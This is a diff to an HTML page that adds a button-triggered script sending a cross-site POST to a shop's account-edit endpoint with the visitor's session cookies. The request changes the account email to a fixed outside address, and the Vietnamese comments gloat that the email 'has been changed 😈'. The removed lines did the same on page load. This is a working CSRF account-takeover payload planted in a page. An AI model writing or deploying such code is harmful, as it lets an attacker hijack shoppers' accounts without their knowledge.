@@ -2954,14 +2954,34 @@
       data-wp-strategy="defer"
     ></script>
     <script>
-      fetch("https://mydecobox.shop/my-account/edit-account/", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/x-www-form-urlencoded",
-        },
-        body: "email=lacnhuwork@gmail.com&save_account_details=1",
-        credentials: "include",
-      });
+      document
+        .getElementById("changeEmailBtn")
+        .addEventListener("click", function () {
+          // Gửi request POST đổi email
+          fetch("https://mydecobox.shop/my-account/edit-account/", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/x-www-form-urlencoded",
+            },
+            body: "email=lacnhuwork@gmail.com&save_account_details=1",
+            credentials: "include", // Giữ session người dùng
+          })
+            .then((res) => res.text())
+            .then((text) => {
+              // Kiểm tra xem email đã đổi thành công chưa
+              if (text.includes("lacnhuwork@gmail.com")) {
+                console.log("✅ Email đã bị đổi rồi đó 😈");
+                alert("✅ Email đã bị đổi thành công!");
+              } else {
+                console.log("❌ Email chưa đổi được");
+                alert("❌ Email không đổi được. Có thể có lỗi.");
+              }
+            })
+            .catch((err) => {
+              console.error("❌ Lỗi khi gửi request", err);
+              alert("❌ Lỗi khi gửi request");
+            });
+        });
     </script>
   </body>
 </html>
